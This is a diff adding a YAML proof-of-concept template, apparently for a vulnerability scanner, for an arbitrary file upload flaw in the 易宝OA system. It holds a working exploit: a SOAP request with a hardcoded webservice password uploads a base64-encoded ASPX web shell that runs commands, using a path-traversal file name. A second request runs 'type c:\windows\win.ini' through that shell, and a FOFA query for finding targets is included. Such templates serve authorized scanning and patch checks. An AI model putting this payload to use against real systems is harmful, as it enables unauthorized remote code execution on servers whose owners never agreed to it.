@@ -1,0 +1,33 @@
+id: poc-yaml-yee-pay-oa-BasicService-rce
+info:
+  name: 易宝OA BasicService 任意文件上传漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 易宝OA
+  fofa: app="顶讯科技-易宝OA系统"
+variables:
+  name: random_str(6)
+requests:
+- method: POST
+  path: /WebService/BasicService.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+  data: <?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+    <soap:Body> <UploadPersonalFile xmlns="http://tempuri.org/"> <fs>PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiIHZhbGlkYXRlUmVxdWVzdD0iZmFsc2UiICU+CjwlCnZhciBjPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbygiY21kIik7CnZhciBlPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcygpOwp2YXIgb3V0OlN5c3RlbS5JTy5TdHJlYW1SZWFkZXIsRUk6U3lzdGVtLklPLlN0cmVhbVJlYWRlcjsKYy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7CmMuUmVkaXJlY3RTdGFuZGFyZE91dHB1dD10cnVlOwpjLlJlZGlyZWN0U3RhbmRhcmRFcnJvcj10cnVlOwplLlN0YXJ0SW5mbz1jOwpjLkFyZ3VtZW50cz0iL2MgIiArIFJlcXVlc3QuSXRlbVsiY21kIl07CmUuU3RhcnQoKTsKb3V0PWUuU3RhbmRhcmRPdXRwdXQ7CkVJPWUuU3RhbmRhcmRFcnJvcjsKZS5DbG9zZSgpOwpSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkgKyBFSS5SZWFkVG9FbmQoKSk7ClN5c3RlbS5JTy5GaWxlLkRlbGV0ZShSZXF1ZXN0LlBoeXNpY2FsUGF0aCk7ClJlc3BvbnNlLkVuZCgpOyU+</fs>
+    <FileName>../../manager/{{.name}}.aspx</FileName> <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
+    </UploadPersonalFile> </soap:Body> </soap:Envelope>
+  expression: 'status_code == 200 && contains(body,"<soap:Body>") && contains(headers,"text/xml")
+
+    '
+- method: POST
+  path: /{{.name}}.aspx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: cmd=type c:\\windows\win.ini
+  expression: 'status_code == 200 && contains(body,"for 16-bit app support") && contains(body,"[fonts]")
+    && contains(body,"[Mail]")
+
+    '
+transport: http
